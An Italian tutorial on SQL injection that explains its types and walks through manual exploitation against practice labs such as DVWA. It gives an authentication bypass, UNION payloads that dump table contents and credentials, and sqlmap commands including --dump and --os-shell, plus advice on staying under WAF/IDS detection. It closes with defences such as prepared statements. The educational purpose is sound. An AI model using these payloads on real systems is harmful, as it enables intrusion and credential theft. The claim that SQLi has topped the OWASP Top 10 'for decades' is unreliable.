# SQL Injection: capire e sfruttare la vulnerabilità più classica del web

## Introduzione

La **SQL Injection** (SQLi) è una delle vulnerabilità web più vecchie, più studiate e — incredibilmente — ancora tra le più diffuse. È al primo posto della OWASP Top 10 da decenni.

L'idea di base è semplice: un'applicazione web costruisce query SQL concatenando input dell'utente senza validarlo. L'attaccante inietta codice SQL nell'input per modificare la logica della query.

---

## Come funziona: l'esempio classico

Immagina una pagina di login che fa questa query:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT';
```

Se l'utente inserisce:
- username: `admin`
- password: `password123`

La query diventa:
```sql
SELECT * FROM users WHERE username='admin' AND password='password123';
```

Normale. Ma se l'utente inserisce come username:
```
admin'--
```

La query diventa:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='qualsiasi';
```

Il `--` è un commento in SQL. Tutto quello che viene dopo viene ignorato. La password non viene controllata. Accesso ottenuto come `admin`.

---

## Tipi di SQL Injection

### In-band SQLi

La risposta del database arriva direttamente nella risposta HTTP. Più facile da sfruttare.

**Error-based:** l'applicazione mostra gli errori SQL — rivelano struttura del database.

**UNION-based:** usi `UNION SELECT` per recuperare dati da altre tabelle.

### Blind SQLi

L'applicazione non mostra output del database, ma il comportamento cambia in base alla query.

**Boolean-based:** fai domande vero/falso e osservi il comportamento della pagina.
```
?id=1 AND 1=1    → pagina normale
?id=1 AND 1=2    → pagina diversa/vuota
```

**Time-based:** usi funzioni di sleep per capire se la query è vera o falsa.
```
?id=1; IF(1=1, SLEEP(5), 0)--    → pagina risponde dopo 5 secondi
```

### Out-of-band SQLi

I dati vengono estratti tramite canali alternativi (DNS, HTTP). Raro ma esiste.

---

## Pratica: SQLi manuale passo per passo

Useremo come esempio **DVWA** (Damn Vulnerable Web Application) o qualsiasi lab vulnerabile.

### Step 1: verifica se è vulnerabile

```
?id=1'
```

Se vedi un errore SQL, sei sulla strada giusta. Se la pagina si comporta diversamente con `1' AND 1=1--` vs `1' AND 1=2--`, è blind SQLi.

### Step 2: trova il numero di colonne (per UNION)

```
?id=1' ORDER BY 1--    → ok
?id=1' ORDER BY 2--    → ok
?id=1' ORDER BY 3--    → ok
?id=1' ORDER BY 4--    → errore → la tabella ha 3 colonne
```

### Step 3: trova le colonne visualizzate

```
?id=-1' UNION SELECT NULL,NULL,NULL--
?id=-1' UNION SELECT 1,2,3--
```

Se la pagina mostra "2" e "3", quelle sono le colonne in cui puoi iniettare output.

### Step 4: estrai informazioni

```sql
-- Database corrente
?id=-1' UNION SELECT 1,database(),3--

-- Versione del DBMS
?id=-1' UNION SELECT 1,version(),3--

-- Lista delle tabelle
?id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--

-- Colonne di una tabella
?id=-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

-- Dati dalla tabella users
?id=-1' UNION SELECT 1,concat(username,':',password),3 FROM users--
```

---

## SQLMap: automatizzare il tutto

**SQLMap** è uno strumento che automatizza il rilevamento e lo sfruttamento di SQL injection.

```bash
# Installazione
sudo apt install sqlmap

# Scan base su un URL con parametro GET
sqlmap -u "http://target.com/page.php?id=1"

# Con parametro POST (form di login)
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Con cookie di sessione autenticata
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Dump del database
sqlmap -u "http://target.com/page.php?id=1" --dbs          # lista DB
sqlmap -u "http://target.com/page.php?id=1" -D mydb --tables  # tabelle
sqlmap -u "http://target.com/page.php?id=1" -D mydb -T users --dump  # dati

# Tentativo di shell sul sistema
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

> **Nota:** SQLMap è rumoroso e viene rilevato facilmente da WAF e IDS. Per pentest reali, la SQLi manuale è preferibile per restare sotto il radar.

---

## Difendersi dalla SQL Injection

### Prepared Statements (la soluzione corretta)

```php
// VULNERABILE
$query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "'";

// SICURO — Prepared Statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['user']]);
```

Con i prepared statement, l'input dell'utente non viene mai interpretato come codice SQL — viene trattato sempre e solo come dato.

### Altre misure

- **Validazione input:** accetta solo ciò che ti aspetti (solo numeri se aspetti un ID)
- **Principio del minimo privilegio:** l'utente del database deve avere solo i permessi strettamente necessari
- **WAF:** Web Application Firewall come ModSecurity può bloccare molti payload SQLi
- **Error handling:** non mostrare mai errori SQL all'utente finale

---

## Dove esercitarsi

- **DVWA** — Damn Vulnerable Web Application (installabile in locale)
- **WebGoat** — di OWASP, ottimo per principianti
- **TryHackMe** — room "SQL Injection" e "SQLMap"
- **HackTheBox** — macchine con vulnerabilità web realistiche
- **PortSwigger Web Security Academy** — il miglior corso gratuito su SQLi e web hacking

---

## Conclusione

La SQL Injection è semplice nel concetto ma infinitamente varia nelle implementazioni reali. Database diversi (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) hanno sintassi diverse. Filtri e WAF rendono le cose più complicate. Blind SQLi richiede pazienza e automazione.

Ma la logica di fondo non cambia mai: **l'applicazione si fida dell'input dell'utente**. Questo è l'errore fondamentale.
